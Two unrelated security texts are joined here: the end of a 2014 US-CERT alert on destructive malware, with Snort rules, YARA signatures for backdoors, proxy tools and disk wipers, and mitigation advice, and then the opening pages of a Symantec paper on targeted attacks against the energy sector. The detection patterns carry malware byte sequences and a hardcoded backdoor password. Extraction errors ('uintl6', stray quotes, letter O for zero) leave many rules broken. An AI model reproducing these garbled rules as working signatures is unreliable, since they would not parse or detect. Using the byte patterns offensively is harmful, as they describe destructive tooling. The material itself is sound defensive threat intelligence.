alert ip any any - > any any ( msg:"Wiper4";content:"|aa 74 ba f2 b9 75|";offset:0;depth:74;sid:4 ; )
Listening Implant :
alert tcp any any - > any any ( msg:"Backdoor1";content:"|0c 1f 1f 1f 4d 5a 4c 4f 50 51 4c 5a 3f 2d 2f 2f 3f 50 54 3e 3e 3e|";offset:0;depth:22;sid:9 ; )
alert tcp any any - > any any ( msg:"Backdoor2";content:"|d3 c4 d2 d1 ce cf d2 c4 a1 b3 b1 b1 a1 ce ca a0 a0 a0|";offset:0;depth:18;sid:12 ; )
alert ip any any - > any any ( msg:"Backdoor3";content:"|17 08 14 13 67 0f 13 13 17 67 15 02 16 12 02 14 13 78 47 47|";depth:24;sid:1 ; )
alert ip any any - > any any ( msg:"Backdoor4";content:"|4f 50 4c 4b 3f 57 4b 4b 4f 3f 4d 5a 4e 4a 5a 4c 4b 20 1f|";depth:23;sid:2 ; )
alert ip any any - > any any ( msg:"Backdoor5";content:"|15 02 14 17 08 09 14 02 67 75 77 77 67 08 0c 66 66 66|";depth:22;sid:3 ; )
alert tcp any any - > any any ( msg:"Backdoor6";content:"|09 22 33 30 28 35 2c|";sid:4 ; )
alert tcp any any - > any any ( msg:"Backdoor7";content:"|13 2f 22 35 22 67 26 35 22 29 27 33 67 28 37 22 29 67 37 28 35 33 34 69|";sid:5 ; )
alert tcp any any - > any any ( msg:"Backdoor8";content:"|43 47 47 47 45 67 47 47 43 47 47 47 44 67 47 47|";sid:6 ; )
alert tcp any any - > any any ( msg:"Backdoor9";content:"|43 47 47 47 42 67 47 47 43 47 47 47 4f 67 47 47 43 47 47 47 43 67 47 47 43 47 47 47 4e 67 47
47|";sid:7 ; )
alert tcp any any - > any any ( msg:"Backdoor10";content:"|d1 ce d2 d5 a1 c9 d5 d5 d1 a1 d3 c4 d0 d4 c4 d2 d5 be|";offset:0;depth:18;sid:8 ; )
alert tcp any any - > any any ( msg:"Backdoor11";content:"|17 08 14 13 67 0f 13 13 17 67 15 02 16 12 02 14 13 78|";offset:0;depth:18;sid:10 ; )
alert tcp any any - > any any ( msg:"Backdoor12";content:"|0c 1f 1f 1f 4f 50 4c 4b 3f 57 4b 4b 4f 3f 4d 5a 4e 4a 5a 4c 4b 20|";sid:11 ; )
Lightweight Backdoor :
alert tcp any 488 < > any any ( msg:"Proxy1";content:"|60 db 37 37 37 37 37 37|";sid:3 ; )
alert tcp any any - > any 488 ( msg:"Proxy2";content:"|60 db 37 37 37 37 37 37|";sid:4 ; )
alert tcp any any - > any any ( msg:"Proxy3";content:"|4c 4c|";offset:16;depth:2;content:"|75 14 2a 2a|";distance:4;within:4;sid:4 ; )
alert tcp any any - > any any ( msg:"Proxy4";content:"|8A 10 80 C2 67 80 F2 24 88 10|";content:"8A 10 80 F2 24 80 EA 67 88 10";sid:2 ; )
alert tcp any 488 < > any any ( msg:"Proxy5";content:"|65 db 37 37 37 37 37 37|";sid:2 ; )
alert tcp any any - > any 488 ( msg:"Proxy6";content:"|65 db 37 37 37 37 37 37|";sid:2 ; )
alert tcp any [ 547,8080,133,117,189,159 ] - > any any ( msg:"Proxy7";content:"|7b 08 2a 2a|";offset:17;content:"|08 2a 2a 01 00|";distance:0;sid:1 ; )
alert tcp any any - > any any ( msg:"Proxy8";content:"|8A 10 80 EA 62 80 F2 B4 88 10|";content:"|8A 10 80 F2 B4 80 C2 62 88 10|";sid:1 ; )
alert tcp any any - > any any ( msg:"Proxy9";content:"|8A 10 80 C2 4E 80 F2 79 88 10|";content:"|8A 10 80 F2 79 80 EA 4E 88 10[";sid:3 ; )
alert tcp any any - > any any ( msg:"Proxy10";content:"Sleepy!@#qaz13402scvsde890";nocase;content:"BC435@PRO62384923412!@3!";nocase;sid:5 ; )
Proxy Tool :
alert tcp any any - > any any ( msg:"Wiper1";content:"|8A 10 80 C2 3A 80 F2 73 88 10|";content:"|8A 10 80 F2 73 80 EA 3A 88 10|";sid:4 ; )
alert tcp any any - > any any ( msg:"Wiper2";content:!"HTTP/1";content:"|e2 1d 49 49|";offset : O;depth:4;content:"|49 49 49 49|";distance:4;within:4;sid:6 ; )
alert tcp any any - > any any ( msg:"Wiper3";content:"|82 F4 DE D4 D3 C2 CA F5 C8 C8 D3 82 FB F4 DE D4 D3 C2 CA 94 95 FB D4 D1 C4 CF C8 D4 D3 89 C2
DF C2 87 8A CC 87 00|";sid:1 ; )
Malware associated with the cyber threat actor :
alert tcp any any - > any [ 8000,8080 ] ( msg:"WIPER4";flow : established , to_server;dsize:42;content:"|28 00|";depth:2;content:"|04 00 00
00|";offset:38;depth:4;sid:123 ; )
Host Based Indicators
Below are potential YARA signatures to detect malware binaries on host machines :
SMB Worm Tool :
strings :
$ STR1 = " Global\\FwtSqmSession106829323_S-1 - 5 - 19 "
$ STR2 = " EVERYONE "
$ STR3 = " y0uar3@s!llyid!07,ou74n60u7f001 "
$ STR4 = " \\KB25468.dat " condition :
( uintl6(0 ) = = 0x5A4D or uint16(0 ) = = 0xCFD0 or uint16(0 ) = = 0xC3D4 or uint32(0 ) = = 0x46445025 or uint32(1 ) = = 0x6674725C ) and all of them
Lightweight Backdoor :
strings :
$ STR1 = ' ' NetMgStart "
$ STR2 = ' ' Netmgmt.srg "
condition :
( uint16(0 ) = = 0x5A4D ) and all of them
Lightweight Backdoor :
strings :
$ STR1 = " prxTroy " ascii wide nocase
condition :
( uintl6(0 ) = = 0x5A4D or uint16(0 ) = = 0xCFD0 or uintl6(0 ) = = 0xC3D4 or uint32(0 ) = = 0x46445025 or uint32(1 ) = = 0x6674725C ) and all of them
Lightweight Backdoor :
strings :
$ strl = { C6 45 E8 64 C6 45 E9 61 C6 45 EA 79 C6 45 EB 69 C6 45 EC 70 C6 45 ED 6D C6 45 EE 72 C6 45 EF 2E C6 45 F0 74 C6 45 F1 62 C6 45 F2 6C } //
' dayipmr.tbl ' being moved to ebp
condition :
( uintl6(0 ) = = 0x5A4D or uintl6(0 ) = = 0xCFD0 or uint16(0 ) = = 0xC3D4 or
uint32(0 ) = = 0x46445025 or uint32(1 ) = = 0x6674725C ) and all of them
Lightweight Backdoor :
strings :
$ strl = { C6 45 F4 61 C6 45 F5 6E C6 45 F6 73 C6 45 F7 69 C6 45 F8 2E C6 45 F9 6E C6 45 FA 6C C6 45 FB 73 } // ' ansi.nls ' being moved to ebp
condition :
( uint16(0 ) = = 0x5A4D or uint16(0 ) = = 0xCFD0 or uintl6(0 ) = = 0xC3D4 or
uint32(0 ) = = 0x46445025 or uint32(1 ) = = 0x6674725C ) and all of them
Lightweight Backdoor :
strings :
$ strl = { C6 45 F4 74 C6 45 F5 6C C6 45 F6 76 C6 45 F7 63 C6 45 F8 2E C6 45 F9 6E C6 45 FA 6C C6 45 FB 73 } // ' tlvc.nls ' being moved to ebp
condition :
( uint16(0 ) = = 0x5A4D or uint16(0 ) = = 0xCFD0 or uint16(0 ) = = 0xC3D4 or uint32(0 ) = = 0x46445025 or uint32(1 ) = = 0x6674725C ) and all of them
Lightweight Backdoor :
strings :
$ STR1 = { 8A 10 80 ? ? 4E 80 ? ? 79 88 10 }
$ STR2 = { SA 10 80 ? ? 79 80 ? ? 4E 88 10 }
condition :
( uintl6(0 ) = = 0x5A4D or uintl6(0 ) = = 0xCFD0 or uint16(0 ) = = 0xC3D4 or uint32(0 ) = = 0x46445025 or uint32(1 ) = = 0x6674725C ) and all of them
Proxy Tool :
strings :
$ STR1 = " pmsconfig.msi " wide
$ STR2 = " pmslog.msi " wide
condition :
( uint16(0 ) = = 0x5A4D or uint16(0 ) = = 0xCFD0 or uintl6(0 ) = = 0xC3D4 or uint32(0 ) = = 0x46445025 or uint32(1 ) = = 0x6674725C ) and any of them
Proxy Tool :
strings :
$ STR1 = { 82 F4 DE D4 D3 C2 CA F5 C8 C8 D3 82 FB F4 DE D4 D3 C2 CA 94 95 FB D4 Dl C4 CF C8 D4 D3 89 C2 DF C2 87 8A CC 87 00 } //
' % SystemRoot%\System32\svchost.exe -k ' xor A7
condition :
( uint16(0 ) = = 0x5A4D or uintl6(0 ) = = 0xCFD0 or uint16(0 ) = = 0xC3D4 or
uint32(0 ) = = 0x46445025 or uint32(1 ) = = 0x6674725C ) and all of them
Proxy Tool :
strings :
$ STR2 = { 8A 04 17 8B FB 34 A7 46 88 02 83 C9 FF }
condition :
( uintl6(0 ) = = 0x5A4D or uint16(0 ) = = 0xCFD0 or uintl6(0 ) = = 0xC3D4 or uint32(0 ) = = 0x46445025 or uint32(1 ) = = 0x6674725C ) and $ STR2
Destructive Hard Drive Tool :
strings :
$ str0= " MZ "
$ str1 = { c6 84 24 ? ? ( 00 | 01 ) 00 00 }
$ xorInLoop = { 83 EC 20 B9 08 00 00 00 33 D2 56 8B 74 24 30 57 8D 7C 24 08
F3 A5 8B 7C 24 30 85 FF 7E 3A 8B 74 24 2C 8A 44 24 08 53 8A 4C 24 21 8A 5C 24 2B 32 C1 8A 0C 32 32 C3 32 C8 88 0C 32 B9 1E 00 00 00 8A 5C 0C 0C 88
5C 0C 0D 49 83 F9 FF 7F F2 42 88 44 24 0C 3B D7 7C D0 5B 5F 5E 83 C4 20 C3 }
condition :
$ str0 at 0 and $ xorInLoop and # str1 > 300
Destructive Target Cleaning Tool :
strings :
$ s1 = { d3000000 [ 4 ] 2c000000 [ 12 ] 95000000 [ 4 ] 6a000000 [ 8 ] 07000000 }
condition :
( uintl6(0 ) = = 0x5A4D and uintl6(uint32(0x3c ) ) = = 0x4550 ) and all of them
Destructive Target Cleaning Tool :
strings
$ secureWipe= { 83 EC 34 53 55 8B 6C 24 40 56 57 83 CE FF 55 C7 44 24 2C D3 00 00 00 C7 44 24 30 2C 00 00 00 89 74 24 34 89 74 24 38 C7 44 24 3C 95 00
00 00 C7 44 24 40 6A 00 00 00 89 74 24 44 C7 44 24 14 07 00 00 00 FF 15 ? ? ? ? ? ? ? ? 3B C6 89 44 24 1C OF 84 ( D8 | d9 ) 01 00 00 33 FF 68 00 00 01 00 57 FF
15 ? ? ? ? ? ? ? ? 8B D8 3B DF 89 5C 24 14 OF 84 ( BC | BD ) 01 00 00 8B 44 24 1C A8 01 74 0A 24 FE 50 55 FF 15 ? ? ? ? ? ? ? ? 8B 44 24 4C 2B C7 74 20 48 74 0F
83 E8 02 75 1C C7 44 24 10 03 00 00 00 EB 12 C7 44 24 10 01 00 00 00 89 74 24 28 EB 04 89 7C 24 10 8B 44 24 10 89 7C 24 1C 3B C7 OF 8E ( 5C | 5d ) 01 00
00 8D 44 24 28 89 44 24 4C EB 03 83 CE FF 8B 4C 24 4C 8B 01 3B C6 74 17 8A D0 B9 00 40 00 00 8A F2 8B FB 8B C2 C1 E0 10 66 8B C2 F3 AB EB ( 13 | 14 )
33 F6 ( E8 | ff 15 ) ? ? ? ? ? ? ? ? 88 04 1E 46 81 FE 00 00 01 00 7C ( EF | ee ) 6A 00 6A 00 6A 03 6A 00 6A 03 68 00 00 00 C0 55 FF 15 ? ? ? ? ? ? ? ? 8B F0 83 FE FF
OF 84 FA 00 00 00 8D 44 24 20 50 56 FF 15 ? ? ? ? ? ? ? ? 8B 2D ? ? ? ? ? ? ? ? 6A 02 6A 00 6A FF 56 FF D5 8D 4C 24 18 6A 00 51 6A 01 53 56 FF 15 ? ? ? ? ? ? ? ?
56 FF 15 ? ? ? ? ? ? ? ? 6A 00 6A 00 6A 00 56 FF D5 8B 44 24 24 8B 54 24 20 33 FF 33 DB 85 CO 7C 5A 7F 0A 85 D2 76 54 EB 04 8B 54 24 20 8B CA BD 00 00
01 00 2B CF 1B C3 85 C0 7F 0A 7C 04 3B CD 73 04 2B D7 8B EA 8B 44 24 14 8D 54 24 18 6A 00 52 55 50 56 FF 15 ? ? ? ? ? ? ? ? 8B 6C 24 18 8B 44 24 24 03
FD 83 D3 00 3B D8 7C BE 7F 08 8B 54 24 20 3B FA 72 B8 8B 2D ? ? ? ? ? ? ? ? 8B 5C 24 10 8B 7C 24 1C 8D 4B FF 3B F9 75 17 56 FF 15 ? ? ? ? ? ? ? ? 6A 00 6A
00 6A 00 56 FF D5 56 FF 15 ? ? ? ? ? ? ? ? 56 FF 15 ? ? ? ? ? ? ? ? 56 FF 15 ? ? ? ? ? ? ? ? 8B 4C 24 4C 8B 6C 24 48 47 83 C1 04 3B FB 8B 5C 24 14 89 7C 24 1C 89
4C 24 4C 0F 8C ( AE | AD ) FE FF FF 6A 00 55 E8 ? ? ? ? ? ? ? ? 83 C4 08 53 FF 15 ? ? ? ? ? ? ? ? 5F 5E 5D 5B 83 C4 34 C3 }
condition :
$ secureWipe
Destructive Target Cleaning Tool :
strings :
$ S1_CMD_Arg = " " /install ' " ' fullword
$ S2_CMD_Parse= " " \""%s ' " ' /install \""%s\ " " ' " ' fullword
$ S3_CMD_Builder= " " \'"'%s\ " " \""%s\ ' " ' \""%s\ ' " ' % s ' " ' fullword
condition :
all of them
Destructive Target Cleaning Tool :
strings :
$ BATCH_SCRIPT_LN1_0 = " " goto x " " fullword
$ BATCH_SCRIPT_LN1_1 = ' " ' del " " fullword
$ BATCH_SCRIPT_LN2_0 = " " if exist " " fullword
$ BATCH_SCRIPT_LN3_0 = " " :x ' " ' fullword
$ BATCH_SCRIPT_LN4_0 = " " zz%d.bat " '' fullword
condition :
( # BATCH_SCRIPT_LNl_l = = 2 ) and all of them "
Destructive Target Cleaning Tool :
strings :
$ MCU_DLL_ZLIB_COMPRESSED2=
{ 5CECABAE813CC9BCD5A542F454910428343479806F71D5521E2AOD }
condition :
$ MCU_DLL_ZLIB_COMPRESSED2 "
Destructive Target Cleaning Tool :
strings :
$ MCU_INF_StartHexDec =
{ 010346080A30D63633000B6263750A5052322A00103D1B570A30E67F2A00130952690A50 3A0D2A000E00A26El5104556766572636C7669642E657865 }
$ MCU_INF_StartHexEnc =
{ 6C3272386958BF075230780A0A54676166024968790C7A6779588F5E47312739310163615B3D59686721CF5F2120263ElF5413531FlE004543544C55 }
condition :
$ MCU_INF_StartHexEnc or
$ MCU_INF_StartHexDec

Destructive Target Cleaning Tool :
strings :
$ = " SetFilePointer "
$ = " SetEndOfFile "
$ = { 75 17 56 ff 15 ? ? ? ? ? ? ? ? 6a 00 6a 00 6a 00 56 ffD5 56 ff 15 ? ? ? ? ? ?
? ? 56 }
condition :
( uint16(0 ) = = 0x5A4D and uint16(uint32(0x3c ) ) = = 0x4550 ) and all of them
Destructive Target Cleaning Tool :
strings :
$ license=
{ E903FFFF820050006F007200740069006F006E007300200063006F007000790072006900670068007400200052006F006200650072007400200064006500200042006100740068002C00
$ PuTTY= { 50007500540054005900 }
condition :
( uint16(0 ) = = 0x5A4D and uintl6(uint32(0x3c ) ) = = 0x4550 ) and $ license and not $ PuTTY
Malware used by cyber threat actor :
strings :
$ heapCreateFunction_0 = { 33C06A003944240868001000000F94C050FF15????????85C0A3???????07436E893FEFFFF83F803A3 ? ? ? ? ? ? ?
0750D68F8030000E8??00000059EB0A83F8027518E8????000085C0750FFF35???????0FF15???????033C0C36A0158C3 }
$ heapCreateFunction =
{ 558BECB82C120000E8????FFFF8D8568FFFFFF5350C78568FFFFFF94000000FF1 ? ? ? ? ? ? ? ?
085C0741A83BD78FFFFFF02751183BD6CFFFFFF0572086A0158E9020100008D85D4EDFFF68901000005068???????0FF15 ? ? ? ? ? ? ?
085C00F84D000000033DB8D8DD4EDFFFF389DD4EDFFFF74138A013C617C083C7A7F042C20880141381975ED8D85D4EDFFFF6A165068???????0E8 ? ? ? ?
000083C40C85C075088D85D4EDFFFFEB498D8564FEFFFF68040100005053FF15 ? ? ? ? ? ? ?
0389D64FEFFFF8D8D64FEFFFF74138A013C617C083C7A7F042C20880141381975ED8D8564FEFFFF508D85D4EDFFFF50E8 ? ? ? ? ? ? ? ?
59593BC3743E6A2C50E8????????593BC3597430408BC83818740E80393B75048819EB0141381975F26A0A5350E8 ? ? ? ?
000083C40C83F802741D83F803741883F80174138D45FC50E898FEFFFF807DFC06591BC083C0035BC9C3 }
$ getMajorMinorLinker =
{ 568B7424086A00832600FF15???????06681384D5A75148B483C85C9740D03C18A481A880E8A401B8846015EC3 }
$ openServiceManager =
{ FF15???0?0?08B?885??74????????????????5?FF15???0?0?08B?????0?0?08BF?85F?74 }
condition :
all of them
Malware used by cyber threat actor :
strings :
$ str1 = " _ quit "
$ str2 = " _ exe "
$ str3 = " _ put "
$ str4 = " _ got "
$ str5 = " _ get "
$ str6 = " _ del "
$ str7 = " _ dir "
$ str8 = { C7 44 24 18 1F F7 }
condition :
( uintl6(0 ) = = 0x5A4D or uintl6(0 ) = = 0xCFD0 or uintl6(0 ) = = 0xC3D4 or uint32(0 ) = = 0x46445025 or uint32(1 ) = = 0x6674725C ) and all of them
Malware used by cyber threat actor :
strings :
$ STR1 = { 50 68 80 00 00 00 68 FF FF 00 00 51 C7 44 24 1C 3a 8b 00 00 }
condition :
( uintl6(0 ) = = 0x5A4D or uint16(0 ) = = 0xCFD0 or uintl6(0 ) = = 0xC3D4 or uint32(0 ) = = 0x46445025 or uint32(1 ) = = 0x6674725C ) and all of them
Recommended Security Practices
Because of the highly destructive functionality of the malware , an organization infected with the malware could experience operational impacts including loss of
intellectual property ( IP ) and disruption of critical systems . Actual impact to organizations may vary depending on the type and number of systems impacted .
Tactical Mitigations
Implement the indicators of compromise within your systems for detection and mitigation purposes .
Encourage users to transfer critical files to network shares , to allow for central backed up .
Execute daily backups of all critical systems .
Periodically execute an “ offline ” backup of critical files to removable media .
Establish emergency communications plans should network resources become unavailable .
Isolate any critical networks ( including operations networks ) from business systems .
Identify critical systems and evaluate the need for having on - hand spares to quickly restore service .
Ensure antivirus is up to date .
Disable credential caching for all desktop devices with particular importance on critical systems such as servers and restrict the number of cached credential
for all portable devices to no more than three if possible . This can be accomplished through a Group Policy Object ( GPO ) .
Disable AutoRun and Autoplay for any removable media device .
Prevent or limit the use of all removable media devices on systems to limit the spread or introduction of malicious software and possible exfiltration data ,
except where there is a valid business case for use . This business case must be approved by the organization Chief IT Security Officer , with policy / guidance
on how such media should be used .
Consider restricting account privileges . It is our recommendation that all daily operations should be executed using standard user accounts unless
administrative privileges are required for that specific function . Configure all standard user accounts to prevent the execution and installation of any unknown
or unauthorized software . Both standard and administrative accounts should have access only to services required for nominal daily duties , enforcing the
concept of separation of duties . Lastly , disable Web and email capabilities on administrative accounts . Compromise of admin accounts is one vector that
allows malicious activity to become truly persistent in a network environment .
Ensure that password policy rules are enforced and Admin password values are changed periodically .
Consider prohibiting hosts within the production environment or DMZ from sharing an Active Directory enterprise with hosts on other networks . Each
environment should have separate forests within Active Directory , with no trust relationships allowed between the forests if at all possible . If necessary , the
trust relationships should be one - way with the low integrity environment trusting the higher integrity environment .
Consider deployment of a coaching page with click through acceptance ; these are traditionally deployed in an environment to log the acceptance of network
acceptable use policy or to notify users of monitoring . Coaching pages also provide some measure of protection from automated malicious activity . This
occurs because automated malware is normally incapable of physically clicking an acceptance radial button . Automated malware is traditionally hardcoded to
execute , then retrieve commands or additional executables from the Internet . If the malware is unable to initiate an active connection , the full train of infection
is potentially halted . The danger still exists that the physical user will authorize access , but through the use of coaching pages , infections can be limited or at
least the rate of infection reduced .
Monitor logs -- Maintain and actively monitor a centralized logging solution that keeps track of all anomalous and potentially malicious activity .
Ensure that all network operating systems , web browsers , and other related network hardware and software remain updated with all current patches and
fixes .
Strategic Mitigations
Organizations should review Security Tip Handling Destructive Malware # ST13 - 003 and evaluate their capabilities encompassing planning , preparation ,
detection , and response for such an event .
Always keep your patch levels up to date , especially on computers that host public services accessible through the firewall , such as HTTP , FTP , mail , and
DNS services .
Build host systems , especially critical systems such as servers , with only essential applications and components required to perform the intended function .
Any unused applications or functions should be removed or disabled , if possible , to limit the attack surface of the host .
Implement network segmentation through V - LANs to limit the spread of malware .
Consider the deployment of Software Restriction Policy set to only allow the execution of approved software ( application whitelisting )
Recommend the whitelisting of legitimate executable directories to prevent the execution of potentially malicious binaries .
Consider the use of two - factor authentication methods for accessing privileged root level accounts or systems .
Consider deploying a two - factor authentication through a hardened IPsec / VPN gateway with split - tunneling prohibited for secure remote access .
Deny direct Internet access , except through the use of proxies for Enterprise servers and workstations . Perform regular content filtering at the proxies or
external firewall points of presence . Also consider the deployment of an explicit versus transparent proxy policy .
Implement a Secure Socket Layer ( SSL ) inspection capability to inspect both ingress and egress encrypted network traffic for potential malicious activity .
Isolate network services , such as email and Web application servers by utilizing a secure multi - tenant virtualization technology . This will limit the damage
sustained from a compromise or attack of a single network component .
Implement best practice guidance and policy to restrict the use of non - Foundation assets for processing or accessing Foundation - controlled data or systems
( e.g. , working from home , or using a personal device while at the office ) . It is difficult to enforce corporate policies , detect intrusions , and conduct forensic
analysis or remediate compromises on non - corporate owned devices .
Minimize network exposure for all control system devices . Control system devices should not directly face the Internet .
Place control system networks behind firewalls , and isolate or air gap them from the business network .
When remote access is required , use secure methods , such as Virtual Private Networks ( VPNs ) , recognizing that VPN is only as secure as the connected
devices .
Industrial Control System ( ICS)-CERT and US - CERT remind organizations to perform proper impact analysis and risk assessment prior to taking defensive
measures .
References
N / A
Revisions
December 19 , 2014 : Initial Release
This product is provided subject to this Notification and this Privacy & Use policy .

SECURITY RESPONSE
Targeted Attacks Against
the Energy Sector
Candid Wueest
﻿﻿
Version 1.0 – January 13 , 2014 , 14:00 GMT
The energy sector has become a major focus for targeted
attacks and is now among the top five most targeted sectors
worldwide .
Follow us on Twitter                     Visit our Blog
@threatintel                             http://www.symantec.com/connect/symantec-blogs/sr
CONTENTS
OVERVIEW ...................................................................... 3
Introduction ................................................................... 5
Exposed systems : Online and offline ............................. 7
Smart grid : A new potential avenue of attack 	 �������������� 8
History of discovered attacks ...................................... 10
2013 ....................................................................... 10
2008 ....................................................................... 10
2003 ....................................................................... 10
2001 ....................................................................... 10
2000 ....................................................................... 10
Stuxnet ................................................................... 11
Night Dragon .......................................................... 11
Shamoon / Disttrack ................................................ 12
Spear phishing attacks in the energy sector 	 �������������� 14
New Year ’s campaign ............................................. 14
Greek oil campaign ................................................. 14
Motivation and origin ................................................... 16
Protection and mitigation ............................................ 16
Conclusion .................................................................... 19
Appendix ...................................................................... 21
A. Spear phishing .................................................. 21
B. Visualization with TRIAGE .................................. 24
C. Phases of targeted attacks ................................ 25
Resources ..................................................................... 28
OVERVIEW
The energy sector has become a major focus for targeted attacks and is now among the top
five most targeted sectors worldwide . Companies in the sector are facing a growing risk
of having their services interrupted or losing data . The threat to energy firms is only likely
to increase in the coming years as new developments , such as further extensions of smart
grids and smart metering expose more infrastructure to the Internet . Equipment that is
not connected to the Internet and other networks is not immune to threats and there has
already been a number of successful attacks against isolated systems . Operators of critical
infrastructure , as well as energy utility companies , need to be aware of these threats and
prepare accordingly .
The threat to energy firms comes from several different sources . In some cases , espionage
from competitors is the primary motive , with data on new projects , exploration and finances
being targeted . Disruption and destruction are the goals of other attacks . Some instances
appear to be state sponsored , such as the disruption of the Iranian nuclear program by
the Stuxnet worm in 2010 , one of the attacks that began this trend . Others appear to
be the work of hacktivists with political or environmental agendas . Internal attackers ,
like disgruntled employees , are also a major source of attacks that often lead to service
disruption . The majority of the actors behind these attacks have grown more sophisticated
in the way they attack .
During the monitoring period from July 2012 to June 2013 , we observed an average of 74
targeted attacks per day globally . Of these , nine attacks per day targeted the energy sector .
Accounting for 16.3 percent of all attacks , the energy sector was the second most targeted
vertical in the last six months of 2012 , with only the government / public sector exceeding it
with 25.4 percent of all attacks . The high ranking was mainly due to a major attack against
a global oil company , which we observed in September 2012 . However , in the first half of
2013 the energy sector continued to attract a high proportion of attacks , ranking in fifth
place with 7.6 percent of targeted attacks .
Not all of the attacks analyzed used highly sophisticated tools . Most of them could have
been prevented by following best practice guidelines for protecting the IT infrastructure and
the industrial components , indicating that despite high revenues and strategic importance ,
many energy sector companies are not prioritizing cybersecurity .
INTRODUCTION
Many power
utilities companies
fear disruptive
attacks the most ,
regardless of
whether it is done
by internal or
external attackers .
Targeted Attacks Against the Energy Sector
Introduction
The number of targeted cyberattacks in general has risen in the past few years . In addition to this , the rate of
attack exposure has also risen , with more companies becoming aware of attacks , expecting them and searching
for indications of compromise . It is not a new phenomenon , but its importance has grown . The Council on
Foreign Relations , a US think tank , reported that energy companies , including oil and gas producers , were often
the focus of targeted attacks during summer 2012 . In May 2013 the US Department of Homeland Security
( DHS ) warned of an increase in sabotage attacks against US energy companies located in the Middle East . The
government had tracked multiple attacks and issued a warning together with the Industrial Control Systems
Cyber Emergency Response Team ( ICS - CERT ) . A report by the US Congress supported this picture , stating that
many power utilities companies were under constant or daily attack through cyberspace . Taking into account
that successful breaches of critical infrastructures are still rare and that these numbers included generic
malware infections , it nevertheless highlights the potential for cyberattacks in the energy sector .
As in most sectors , attackers are often after valuable information . For example , we have seen attackers target
intellectual property such as technology for photovoltaic research and wind turbines , or data on gas field
exploration . Information such as this is of high value and can generate huge profits for attackers or their
sponsors . The same information can also be misused for an act of sabotage . Many power utilities companies fear
disruptive attacks the most , regardless of whether it is done by internal or external attackers . The energy sector
has a high potential for critical disruption through sabotage attacks . Any interruption to the power grid would
cause substantial chaos and cascading effects resulting in financial loss .
In the past there have been quite a few attacks that included targets in the energy sector . Some of these were
more focused , like Stuxnet , Duqu , Shamoon / Disttrack and Night Dragon . Others saw power companies targeted
among many other sectors , such as Hidden Lynx , Nitro , Flamer , Net Traveler and Elderwood to name a few .
One of the biggest examples , and a game changer for many organizations , was Stuxnet . This targeted sabotage
attack , which is believed to have been aimed against uranium enrichment facilities in Iran , made clear what
could be done through cyberattacks .
It is also clear that the energy sector is not exempt from the generic attacks that every company faces , such
as ransomware that locks PCs or financial Trojans that attempt to steal passwords and credit card details . For
example , such a case happened in May 2013 , when a small fuel distribution company in North Carolina fell
victim to a cyberheist that transferred US$ 800,000 from the company ’s bank account . Such threats spread
broadly and might impact any person , regardless of their employer . These attackers aim at infecting as many
computers as possible in order to maximize their chances of profits . These attacks can include nonspecific data
breaches where employee or customer records get stolen , as happened to the US Department of Energy in July
2013 .
For this paper we focused on email data from targeted attacks between July 2012 and June 2013 . Even though
watering holes are becoming more frequently used in targeted attacks , it is unfortunately quite difficult to
reliably map these to individual campaigns . A blocked drive - by download attempt does not give any indication
if it was a targeted attack or just general noise . In quite a few cases we see the same common malware , like
Poison Ivy , being used by generic attackers and by targeted attacks . In such cases the sole difference between a
sophisticated targeted attack and a generic one lies in the person commanding the malware .
Page 5
EXPOSED SYSTEMS :
ONLINE AND OFFLINE
Experts predict
that billions of
smart meters
and sensors
will be installed
worldwide over the
next ten years .
Targeted Attacks Against the Energy Sector
Exposed systems : Online and offline
Historically most industrial control systems ( ICS ) and supervisory control and data acquisition ( SCADA ) systems
were in separated networks not connected to the Internet or any other network . Unfortunately this security
through segregation approach does not fully protect against cyberattacks . In reality , networks are rarely
completely isolated . Often some configuration updates are periodically installed or log files are transferred . If
systems are not directly connected , the method of choice for these types of interactions is usually through a USB
stick or a non - permanent modem connection , which provides a way into the restricted networks . This allows
malware to spread into such isolated networks as demonstrated many times by threats such as Stuxnet .
If networks are truly segregated , this would mean that there would be no software updates installed , leaving
old vulnerabilities open . There are also issues around processes . For example , the revocation lists for digital
certificates are seldom updated and therefore certificates which are no longer valid can not be checked properly
and would still be accepted .
With the increasing desire for connectivity now reaching industrial plants , many operators have started to
connect their ICS to the Internet . New adapters can bridge to older technology which was never intended to be
controlled over the Internet , allowing it to be connected easily . This allows for efficient centralized monitoring
and , to some extent , remote control of equipment .
Depending on the type of machinery controlled through the human - machine interface ( HMI ) of the ICS , not all
modifications are possible . Some systems are physically connected in a pure read - only mode for monitoring .
And even if they are fully connected , some turbines have physical limitations or emergency systems based on
physical effects that can not be overridden by the digital controller . Thus , not all Hollywood scenarios of open
flood gates or turbines that fly through the air are possible . However , sabotage attacks that damage equipment
are definitely possible , as has already been demonstrated . In the future , more systems are going to implement
the failsafe switches in software , opening up the vector for malware attacks .
An additional source of concern is that some countries have started to open the energy market for smaller
private contributors . This means that almost anyone can use mini power plants like water , wind or photovoltaic
sites to feed energy back into the power grid . Often these operators do not have a full IT staff supporting
the facilities at hand , which might lead to more vulnerable installations . Furthermore they may deploy new
technology which might be untested and contain some unknown vulnerabilities . While these smaller sites make
up only a small portion of the grid , new decentralized power input feeds are a challenge for the balance of the
power grid as well and need to be carefully monitored . Small outages or changes can have a domino effect for
the whole power grid .
To increase the exposure of energy firms even further , sites like SHODAN , which is essentially a search engine
for devices , enable anyone to easily find exposed controllers on the Internet . Of course not all of the industrial
control systems connected to the Internet are critical systems or even real ones . Some researchers have started
to create honey pot systems in order to study the attackers , which have apparently already attracted attackers
like the Comment Crew / APT1 group , who have broken into these decoy systems .
Page 7
Targeted Attacks Against the Energy Sector
Smart grid : A new potential avenue of attack
Smart grids and smart metering are
bringing significant change to
the world ’s power systems .
Experts predict that
billions of smart meters
and sensors will be
installed worldwide
over the next ten
years . They enable
utility companies
to measure energy
consumption at a
more granular
level , creating
better flow
patterns and
enabling
different
prices for
consumption
based on
the time of day and
location . This development
brings new opportunities , as well
as new challenges .
As with any connected infrastructure , it is important to
secure the network and its endpoint on multiple levels . There have
already been proof of concept attacks that demonstrate how smart meters could be manipulated to send
back false information or report incorrect billing IDs , leading to power theft .
In addition to the issue of securing these devices , smart grids will produce a huge amount of data which ,
depending on regulations , will need to be kept for audits . Some of this data may be sensitive and could raise
privacy concerns if not properly protected . This could easily grow to petabytes of data that needs to be safely
stored and managed .
It is beyond the scope of this paper to address all the challenges associated with smart grids and smart meters .
Symantec has created a dedicated whitepaper for this topic : How to protect critical infrastructure , mitigate fraud
and guarantee privacy . As a member of the CRISALIS project , Symantec is following these developments closely
and is helping to secure critical infrastructure together with partners from academia and different industry
sectors .
Page 8
